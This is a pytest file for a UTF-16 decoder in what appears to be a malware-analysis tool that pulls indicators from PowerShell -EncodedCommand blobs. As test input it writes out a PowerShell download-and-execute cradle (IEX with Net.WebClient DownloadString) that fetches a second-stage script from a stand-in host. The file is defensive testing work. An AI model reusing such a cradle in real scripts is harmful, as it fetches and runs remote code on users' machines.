"""Tests for Utf16Decoder: PowerShell -EncodedCommand and .NET UTF-16 strings.

PowerShell's -EncodedCommand is UTF-16LE then base64. After base64 is peeled,
the bytes are UTF-16 with interleaved NULs; the UTF-8 preview then reads
'h\\x00t\\x00t\\x00p...' and IOC regexes break on the NULs. The decoder converts
UTF-16 -> UTF-8 so extraction works. It must NOT fire on binary/PE/random data.
"""

import os
import base64

from titan_decoder.decoders.base import Utf16Decoder
from titan_decoder.core.engine import TitanEngine
from titan_decoder.config import Config


def test_utf16le_decodes_to_utf8():
    dec = Utf16Decoder()
    data = "IEX http://ps.example/a.ps1".encode("utf-16-le")
    assert dec.can_decode(data)
    out, ok = dec.decode(data)
    assert ok and b"http://ps.example/a.ps1" in out and b"\x00" not in out


def test_utf16be_and_bom():
    dec = Utf16Decoder()
    be = "cfg domain.example".encode("utf-16-be")
    out, ok = dec.decode(be)
    assert ok and b"domain.example" in out
    bom = "﻿hi http://b.example/x".encode("utf-16-le")  # includes BOM bytes
    out, ok = dec.decode(bom)
    assert ok and b"http://b.example/x" in out


def test_does_not_fire_on_binary_or_text():
    dec = Utf16Decoder()
    for bad in (os.urandom(512), b"MZ" + b"\x00" * 400, b"\x00" * 256,
                ("plain ascii text " * 20).encode(), b"\x7fELF" + b"\x00" * 400):
        assert dec.can_decode(bad) is False
        assert dec.decode(bad) == (bad, False)


def test_powershell_encodedcommand_end_to_end():
    cfg = Config()
    cfg.set("max_recursion_depth", 10)
    cmd = "IEX (New-Object Net.WebClient).DownloadString('http://malware.example/stage2.ps1')"
    blob = base64.b64encode(cmd.encode("utf-16-le"))
    rep = TitanEngine(cfg).run_analysis(blob)
    assert "http://malware.example/stage2.ps1" in rep["iocs"].get("urls", [])


def test_random_binary_no_utf16_hallucination():
    cfg = Config()
    cfg.set("max_recursion_depth", 10)
    eng = TitanEngine(cfg)
    spurious = 0
    for _ in range(150):
        rep = eng.run_analysis(os.urandom(600))
        spurious += sum(1 for n in rep["nodes"] if n.get("decoder_used") == "UTF16")
        spurious += len(rep["iocs"].get("urls", []))
    assert spurious == 0
